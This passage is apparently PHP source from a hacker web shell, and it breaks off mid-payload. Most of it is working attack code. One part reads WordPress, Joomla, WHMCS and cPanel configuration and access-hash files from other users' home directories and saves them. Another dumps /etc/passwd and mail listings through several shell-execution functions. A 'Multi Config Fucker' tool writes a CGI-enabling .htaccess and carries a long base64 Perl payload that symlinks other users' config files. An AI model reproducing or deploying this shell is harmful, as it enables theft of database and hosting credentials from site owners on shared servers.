					"/home2/$user_Exc/public_html/configuration.php" => "Joomla",
					"/home2/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
					"/home2/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
					"/home2/$user_Exc/public_html/wp-config.php" => "WordPress",
					"/home2/$user_Exc/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_Exc/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_Exc/public_html/application/config/database.php" => "Ellislab",
					"/home3/$user_Exc/.my.cnf" => "cpanel",
					"/home3/$user_Exc/.accesshash" => "WHM-accesshash",
					"/home3/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
					"/home3/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_Exc/public_html/forum/config.php" => "phpBB",
					"/home3/$user_Exc/public_html/sites/default/settings.php" => "Drupal",
					"/home3/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
					"/home3/$user_Exc/public_html/app/etc/local.xml" => "Magento",
					"/home3/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
					"/home3/$user_Exc/public_html/configuration.php" => "Joomla",
					"/home3/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
					"/home3/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
					"/home3/$user_Exc/public_html/wp-config.php" => "WordPress",
					"/home3/$user_Exc/public_html/admin/config.php" => "OpenCart",
					"/home3/$user_Exc/public_html/slconfig.php" => "Sitelok",
					"/home3/$user_Exc/public_html/application/config/database.php" => "Ellislab"
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("Exc_config/$user_Exc-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/Exc_config'><font color=lime>Done</font></a></center>";
			}else{
				
		echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		echo file_get_contents('/etc/passwd'); 
		echo "</textarea><br><input type=\"submit\" value=\"GassPoll\"></td></tr></center>\n";
        }
}elseif($_GET['do'] == 'passwbypass') {
	echo '<center>Bypass etc/passw With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
} elseif(isset($_GET['do']) && ($_GET['do'] == 'multiconfig'))
{	@ini_set('output_buffering',0); 
?>
<form action="?y=<?php echo $pwd; ?>&amp;do=multiconfig" method="post">
<br><br><center><b><font size=4>[ Multi Config Fucker ]</font></b></center>
	<form method=post><br><center><table class='tabnet'>
	<tr><th><b>Php Config</b></th><th><b>Perl Config</b></th><th><b>Litespeed Config Fucker</b></th><th><b>Config Fucker .ini Method</b></th></tr>
	<tr><td><input class='inputzbut' type='submit'name='phpconfig' value="Php Config" /></td><td>
	<input class='inputzbut' type='submit' name='perlconfig' value="Perl Config" /></td><td>
	<input class='inputzbut' type='submit' name='lcf' value="Litespeed Config Fucker" /></td><td>
	<input class='inputzbut' type='submit' name='configini' value="Config Fucker .ini Method" /></td><tr></table>
	</center></form><br><hr><br><br>
 <?php
 @ini_set('html_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@set_time_limit(0);

if(isset($_POST['configini']))
{ echo "<center/><b><font color=>[ Config .ini Method ]</font></b><br><br>";

  mkdir('multi_config', 0755);
    chdir('multi_config');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Error!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI \n AddType application/x-httpd-cgi .pl \n AddHandler cgi-script .pl \n AddHandler cgi-script .pl";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);

$configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5Db25maWcgRnVja2VyIFVzaW5nIC5pbmkgTWV0aG9kPC90aXRsZT4NCjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iaHR0cDovL3BuZy0zLmZpbmRpY29ucy5jb20vZmlsZXMvaWNvbnMvMTkzNS9yZWRfZ2Vtc192b2xfMi8xMjgvcjJfZHJhZ29uLnBuZyIvPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHkgew0KCWJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQoNCn0NCi5uZXdTdHlsZTEgew0KIGZvbnQtZmFtaWx5OiBUYWhvbWE7DQogZm9udC1zaXplOiB4LXNtYWxsOw0KIGZvbnQtd2VpZ2h0OiBib2xkOw0KIGNvbG9yOiAjMDBmZjAwOw0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCnN1YiBsaWx7DQogICAgKCR1c2VyKSA9IEBfOw0KJG1zciA9IHF4e3B3ZH07DQokZG9tYWluPSRtc3IuIi8iLiR1c2VyOw0KJGRvbWFpbj1+cy9cbi8vZzsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0uaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci5pbmknKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy5pbmknKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3MuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS5pbmknKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndwMTMtcHJlc3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3LmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93ZWIvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdlYi5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmxvZ3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWhvbWUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtcHJvdGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+Pm9yZHByZXNzLXNpdGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW1haW4uaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXRlc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXByb3RhbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1zaXRlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbWFpbi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ldy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52YjMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+cGFuZWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RpbmcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LmluaScpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQtc2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLVpDc2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn4+bWstcG9ydGFsZTEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLmluaScpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtLmluaScpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtcy5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+bWFsYXkuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGVudHMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnL2tvbmVrc2kucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZzIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWExLmluaScpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRkb21haW4uJ34+RHJ1cGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9lMTA3X2NvbmZpZy5waHAnLCRkb21haW4uJ34+ZTEwNy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TU0kucGhwJywkZG9tYWluLid+fj5DTUYtZm9ydW0uaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLWZvcnVtLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk90aGVyLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywkZG9tYWluLid+fj5CYWxpdGJhbmcuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnRzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhd